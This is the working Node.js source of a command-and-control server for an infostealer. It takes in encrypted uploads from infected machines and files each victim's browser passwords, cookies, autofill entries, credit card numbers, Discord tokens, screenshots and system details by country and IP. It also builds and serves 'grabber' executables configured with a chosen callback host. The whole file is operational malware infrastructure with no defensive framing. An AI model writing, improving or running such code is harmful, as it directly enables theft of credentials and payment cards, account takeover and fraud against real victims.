'use strict';
const http   = require('http');
const zlib   = require('zlib');
const crypto = require('crypto');
const fs     = require('fs');
const path   = require('path');
const { spawn } = require('child_process');

const PORT     = parseInt(process.argv[2] || '4444', 10);
const DATA_DIR = path.join(__dirname, 'victims');
const ROOT     = path.join(__dirname, '..');
const BIN_DIR  = path.join(ROOT, 'bin');
const BUILDER  = path.join(ROOT, 'builder', 'build_all.py');
fs.mkdirSync(DATA_DIR, { recursive: true });
fs.mkdirSync(BIN_DIR, { recursive: true });

function sanitize(s, max = 40) {
    return String(s || '')
        .replace(/[<>:"/\\|?*\x00-\x1f]/g, '_')
        .replace(/\s+/g, ' ').trim()
        .slice(0, max) || '?';
}

function flat(s) {
    return String(s ?? '').replace(/[\x00-\x1f\x7f]/g, ' ');
}

function isPrivateIp(ip) {
    ip = String(ip).replace(/^::ffff:/, '');
    return ip === '::1' || ip === '127.0.0.1' || ip.startsWith('127.')
        || ip.startsWith('10.') || ip.startsWith('192.168.')
        || /^172\.(1[6-9]|2\d|3[01])\./.test(ip)
        || ip.startsWith('fe80:') || ip.startsWith('fc') || ip.startsWith('fd');
}

const geoCache = new Map();
function resolveCountry(ip) {
    if (geoCache.has(ip)) return Promise.resolve(geoCache.get(ip));
    if (isPrivateIp(ip)) { geoCache.set(ip, 'LAN'); return Promise.resolve('LAN'); }
    return new Promise(res => {
        let done = false;
        const finish = cc => { if (!done) { done = true; geoCache.set(ip, cc); res(cc); } };
        try {
            const req = http.get(
                `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,countryCode`,
                r => {
                    let b = '';
                    r.on('data', c => b += c);
                    r.on('end', () => {
                        try {
                            const j = JSON.parse(b);
                            finish(j.status === 'success' && j.countryCode ? j.countryCode : 'XX');
                        } catch { finish('XX'); }
                    });
                });
            req.on('error', () => finish('XX'));
            req.setTimeout(3000, () => { req.destroy(); finish('XX'); });
        } catch { finish('XX'); }
    });
}

function kvLines(obj) {
    return Object.entries(obj || {})
        .map(([k, v]) => `${k}: ${v}`).join('\n') + '\n';
}

function netscapeCookies(cookies) {
    let out = '# Netscape HTTP Cookie File\n';
    for (const c of cookies) {
        const host = String(c.host || '');
        const domainFlag = /^\./.test(host) || !host.includes('.') ? 'TRUE' : 'FALSE';
        let exp = Number(c.expires) || 0;
        if (exp > 11644473600e6) exp = Math.floor(exp / 1e6) - 11644473600;
        else if (exp > 1e12) exp = Math.floor(exp / 1000);
        if (exp < 0) exp = 0;
        out += [flat(host), domainFlag, flat(c.path || '/'), c.secure ? 'TRUE' : 'FALSE',
                exp, flat(c.name || ''), flat(c.value || '')].join('\t') + '\n';
    }
    return out;
}

function groupByProfile(br) {
    const byProf = new Map();
    const put = (prof, kind, entry) => {
        const p = sanitize(prof || 'Default', 30);
        if (!byProf.has(p)) byProf.set(p, { logins: [], cookies: [], autofill: [], cards: [] });
        byProf.get(p)[kind].push(entry);
    };
    (br.logins   || []).forEach(x => put(x.profile, 'logins', x));
    (br.cookies  || []).forEach(x => put(x.profile, 'cookies', x));
    (br.autofill || []).forEach(x => put(x.profile, 'autofill', x));
    (br.cards    || []).forEach(x => put(x.profile, 'cards', x));
    return byProf;
}

function writeVictimTree(dir, v) {
    fs.mkdirSync(dir, { recursive: true });
    const w = (rel, content) => fs.writeFileSync(path.join(dir, rel), content);

    if (v.sysinfo && Object.keys(v.sysinfo).length) w('info.txt', kvLines(v.sysinfo));
    if (Array.isArray(v.processes) && v.processes.length)
        w('processes.txt', v.processes.map(p =>
            `${p.pid}\t${p.name}\tparent=${p.parent_pid}`).join('\n') + '\n');
    if (Array.isArray(v.desktop_files) && v.desktop_files.length)
        w('desktop.txt', v.desktop_files.map(f =>
            `${f.is_dir ? '<DIR>' : (f.size ?? '')}\t${f.name}`).join('\n') + '\n');
    if (v.screenshot) {
        try { fs.writeFileSync(path.join(dir, 'screenshot.png'),
                               Buffer.from(v.screenshot, 'base64')); } catch {}
    }

    if (Array.isArray(v.discord) && v.discord.length) {
        fs.mkdirSync(path.join(dir, 'discord'), { recursive: true });
        w(path.join('discord', 'discord.txt'),
          v.discord.map(d => `${flat(d.client || '?')}: ${flat(d.token)}`).join('\n') + '\n');
    }

    for (const br of (v.browsers || [])) {
        const bdir = path.join(dir, sanitize(br.browser || 'unknown', 20).toLowerCase());
        const profiles = groupByProfile(br);
        const multi = profiles.size > 1;
        for (const [pname, data] of profiles) {
            const pdir = multi ? path.join(bdir, pname) : bdir;
            fs.mkdirSync(pdir, { recursive: true });
            if (data.logins.length)
                fs.writeFileSync(path.join(pdir, 'passwords.txt'),
                    data.logins.map(l => {
                        const u = flat(l.url).replace(/\/+$/, '');
                        return `${u}/${flat(l.user)}:${flat(l.pass)}`;
                    }).join('\n') + '\n');
            if (data.cookies.length)
                fs.writeFileSync(path.join(pdir, 'cookie.txt'), netscapeCookies(data.cookies));
            if (data.autofill.length)
                fs.writeFileSync(path.join(pdir, 'autofills.txt'),
                    data.autofill.map(a => `${flat(a.field)}: ${flat(a.value)}`).join('\n') + '\n');
            if (data.cards.length)
                fs.writeFileSync(path.join(pdir, 'cards.txt'),
                    data.cards.map(c => `${flat(c.name)}\t${flat(c.number)}\t${flat(c.exp)}`).join('\n') + '\n');
        }
    }
    fs.writeFileSync(path.join(dir, 'data.json'), JSON.stringify(v, null, 2));
}

function listTree(dir, rel = '') {
    const out = [];
    for (const e of fs.readdirSync(dir, { withFileTypes: true }).sort((a, b) =>
        (b.isDirectory() ? 1 : 0) - (a.isDirectory() ? 1 : 0) || a.name.localeCompare(b.name))) {
        const full = path.join(dir, e.name);
        const item = { name: e.name, path: rel ? rel + '/' + e.name : e.name,
                       dir: e.isDirectory() };
        if (e.isDirectory()) item.children = listTree(full, item.path);
        else item.size = fs.statSync(full).size;
        out.push(item);
    }
    return out;
}


const MODULE_WHITELIST = ['browsers','discord','sysinfo','procs','desktop','screenshot'];
let buildRunning = false;
function pushSse(obj) {
    const msg = `data: ${JSON.stringify(obj)}\n\n`;
    for (const c of sseClients) c.write(msg);
}

const victims  = [];
const sseClients = new Set();

function xorDecrypt(buf, key32) {
    const out = Buffer.alloc(buf.length);
    for (let i = 0; i < buf.length; i++) out[i] = buf[i] ^ key32[i % 32];
    return out;
}

const MAGIC = Buffer.from([0xDE, 0xAD, 0xCA, 0xFE]);

function decodePayload(raw) {
    let magicIdx = -1;
    for (let i = 0; i <= raw.length - 4; i++) {
        if (raw[i]===0xDE && raw[i+1]===0xAD && raw[i+2]===0xCA && raw[i+3]===0xFE) {
            magicIdx = i; break;
        }
    }
    if (magicIdx < 0) throw new Error('magic not found');
    const afterMagic = raw.slice(magicIdx + 4);

    let key32 = Buffer.alloc(32, 0);
    let payload = afterMagic;

    if (afterMagic[0] === 0x1F && afterMagic[1] === 0x8B) {
        payload = afterMagic;
    } else if (afterMagic.length >= 32) {
        key32   = afterMagic.slice(0, 32);
        payload = xorDecrypt(afterMagic.slice(32), key32);
    }

    let cur = payload;
    for (let pass = 0; pass < 8; pass++) {
        if (cur[0] !== 0x1F || cur[1] !== 0x8B) break;
        cur = zlib.gunzipSync(cur);
    }
    return JSON.parse(cur.toString('utf8'));
}

process.on('uncaughtException', e => {
    console.error('[C2] uncaught:', e && e.message);
});
process.on('unhandledRejection', e => {
    console.error('[C2] unhandled:', e && (e.message || e));
});

const server = http.createServer((req, res) => {
    const url = req.url.split('?')[0];

    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    if (req.method === 'POST' && url === '/collect') {
        const chunks = [];
        req.on('data', c => chunks.push(c));
        req.on('end', async () => {
            let victim;
            try {
                const raw  = Buffer.concat(chunks);
                const data = decodePayload(raw);
                const id   = crypto.randomUUID();
                const ts   = new Date().toISOString();
                const ipRaw = (req.socket.remoteAddress || '').replace(/^::ffff:/, '');
                victim = { id, ts, ip: ipRaw, ...data };
            } catch(e) {
                console.error('decode error:', e.message);
                res.writeHead(400); res.end('bad');
                return;
            }
            try {
                const host = sanitize(victim.sysinfo?.hostname, 30);
                const user = sanitize(victim.sysinfo?.username, 20);
                const cc   = await resolveCountry(victim.ip);
                const folder = `${cc}_${victim.ip.replace(/[^0-9a-fA-F.:]/g,'_')}_${host}__${user}`;
                victim.folder = folder;
                writeVictimTree(path.join(DATA_DIR, folder), victim);
                victims.push(victim);
                console.log(`[victim] ${folder} (${(victim.browsers||[]).length} browsers, ` +
                    `${(victim.discord||[]).length} tokens)`);
            } catch(e) {
                console.error('store error:', e.message);
            }
            const msg = `data: ${JSON.stringify({ type: 'victim', id: victim.id, ts: victim.ts,
                ip: victim.ip, folder: victim.folder || '?',
                hostname: victim.sysinfo?.hostname || '?',
                user: victim.sysinfo?.username || '?',
                os: victim.sysinfo?.os || '?',
                ulp_count: (victim.ulp||'').split('\n').filter(Boolean).length,
                discord_count: (victim.discord||[]).length
            })}\n\n`;
            for (const c of sseClients) c.write(msg);
            res.writeHead(200); res.end('ok');
        });
        return;
    }

    if (req.method === 'POST' && url === '/build') {
        const chunks = [];
        req.on('data', c => chunks.push(c));
        req.on('end', () => {
            let cfg;
            try { cfg = JSON.parse(Buffer.concat(chunks).toString('utf8')); }
            catch { res.writeHead(400); res.end('{"ok":false,"err":"bad json"}'); return; }

            const host = String(cfg.host || '').trim();
            const port = parseInt(cfg.port, 10);
            const cpath = String(cfg.path || '/collect').trim();
            const modules = Array.isArray(cfg.modules)
                ? cfg.modules.filter(m => MODULE_WHITELIST.includes(m)) : [];

            if (!/^[A-Za-z0-9.:\-\[\]]{1,253}$/.test(host)) {
                res.writeHead(400); res.end('{"ok":false,"err":"bad host"}'); return;
            }
            if (!(port > 0 && port < 65536)) {
                res.writeHead(400); res.end('{"ok":false,"err":"bad port"}'); return;
            }
            if (!/^\/[A-Za-z0-9_\-/]{0,64}$/.test(cpath)) {
                res.writeHead(400); res.end('{"ok":false,"err":"bad path"}'); return;
            }
            if (!modules.length) {
                res.writeHead(400); res.end('{"ok":false,"err":"no modules"}'); return;
            }
            if (buildRunning) {
                res.writeHead(409); res.end('{"ok":false,"err":"build already running"}'); return;
            }

            buildRunning = true;
            const args = [BUILDER, '--host', host, '--port', String(port),
                          '--path', cpath, '--modules', modules.join(',')];
            pushSse({ type: 'build-start', host, port });
            console.log(`[build] ${host}:${port}${cpath} modules=${modules.join(',')}`);

            const child = spawn('python', args, { cwd: ROOT });
            let tail = '';
            const onData = buf => {
                tail += buf.toString('utf8');
                const lines = tail.split(/\r?\n/);
                tail = lines.pop();
                for (const l of lines) if (l.trim()) pushSse({ type: 'build-log', line: l });
            };
            child.stdout.on('data', onData);
            child.stderr.on('data', onData);

            const finish = code => {
                buildRunning = false;
                const expected = path.join(
                    BIN_DIR,
                    `grabber_${host.replace(/[^A-Za-z0-9._-]/g, '_')}_${port}.exe`);
                const ok = code === 0 && fs.existsSync(expected);
                if (tail.trim()) pushSse({ type: 'build-log', line: tail.trim() });
                console.log(`[build] exit ${code} ok=${ok}`);
                pushSse({ type: 'build-done', ok,
                          file: ok ? path.basename(expected) : null,
                          err: ok ? null : 'build failed — see log' });
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok, file: ok ? path.basename(expected) : null }));
            };
            child.on('error', err => {
                buildRunning = false;
                pushSse({ type: 'build-done', ok: false, file: null, err: String(err) });
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: false, err: String(err) }));
            });
            child.on('close', finish);
        });
        return;
    }

    if (req.method === 'GET' && url.startsWith('/download/')) {
        const name = path.basename(url.slice(10));
        if (!/^grabber_[A-Za-z0-9._-]+\.exe$/.test(name)) {
            res.writeHead(400); res.end('bad name'); return;
        }
        const file = path.join(BIN_DIR, name);
        if (!fs.existsSync(file)) { res.writeHead(404); res.end('not built yet'); return; }
        res.writeHead(200, {
            'Content-Type':        'application/octet-stream',
            'Content-Disposition': `attachment; filename="${name}"`,
            'Content-Length':      fs.statSync(file).size
        });
        fs.createReadStream(file).pipe(res);
        return;
    }

    if (req.method === 'GET' && url === '/modules') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(MODULE_WHITELIST));
        return;
    }

    if (req.method === 'GET' && url === '/events') {
        res.writeHead(200, {
            'Content-Type':  'text/event-stream',
            'Cache-Control': 'no-cache',
            'Connection':    'keep-alive'
        });
        res.write('data: {"type":"connected"}\n\n');
        sseClients.add(res);
        req.on('close', () => sseClients.delete(res));
        return;
    }

    if (req.method === 'GET' && url.startsWith('/files/')) {
        const folder = decodeURIComponent(url.slice(7));
        const dir = path.resolve(DATA_DIR, folder);
        if (dir === DATA_DIR || !dir.startsWith(DATA_DIR + path.sep) || !fs.existsSync(dir)) {
            res.writeHead(404); res.end('not found'); return;
        }
        let tree;
        try {
            if (!fs.statSync(dir).isDirectory()) throw new Error('not a dir');
            tree = listTree(dir, folder);
        } catch (e) {
            res.writeHead(404); res.end('not found'); return;
        }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(tree));
        return;
    }

    if (req.method === 'GET' && url === '/victims') {
        const list = victims.map(v => ({
            id: v.id, ts: v.ts, ip: v.ip, folder: v.folder || '?',
            hostname: v.sysinfo?.hostname || '?',
            user: v.sysinfo?.username || '?',
            os: v.sysinfo?.os || '?',
            ulp_count: (v.ulp||'').split('\n').filter(Boolean).length,
            discord_count: (v.discord||[]).length,
            cookie_count: v.browsers?.reduce((a,b) => a + (b.cookies?.length||0), 0) || 0,
            pass_count: v.browsers?.reduce((a,b) => a + (b.logins?.length||0), 0) || 0,
            card_count: v.browsers?.reduce((a,b) => a + (b.cards?.length||0), 0) || 0
        }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(list));
        return;
    }

    if (req.method === 'GET' && url.startsWith('/victim/')) {
        const id = url.slice(8);
        const v  = victims.find(x => x.id === id);
        if (!v) { res.writeHead(404); res.end('not found'); return; }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(v));
        return;
    }

    if (req.method === 'GET' && (url === '/' || url === '/panel.html')) {
        const html = fs.readFileSync(path.join(__dirname, 'panel.html'));
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(html);
        return;
    }

    res.writeHead(404); res.end();
});

for (const entry of fs.readdirSync(DATA_DIR, { withFileTypes: true })) {
    if (!entry.isDirectory()) continue;
    const f = path.join(DATA_DIR, entry.name, 'data.json');
    if (!fs.existsSync(f)) continue;
    try {
        const v = JSON.parse(fs.readFileSync(f, 'utf8'));
        if (v && v.id) { v.folder = v.folder || entry.name; victims.push(v); }
    } catch (e) { console.warn(`[reload] ${entry.name}: ${e.message}`); }
}
if (victims.length) console.log(`[C2] reloaded ${victims.length} victim(s) from disk`);

server.listen(PORT, '127.0.0.1', () => {
    console.log(`[C2] listening on http://127.0.0.1:${PORT}`);
    console.log(`[C2] panel    → http://127.0.0.1:${PORT}/`);
    console.log(`[C2] collect  → POST http://127.0.0.1:${PORT}/collect`);
});
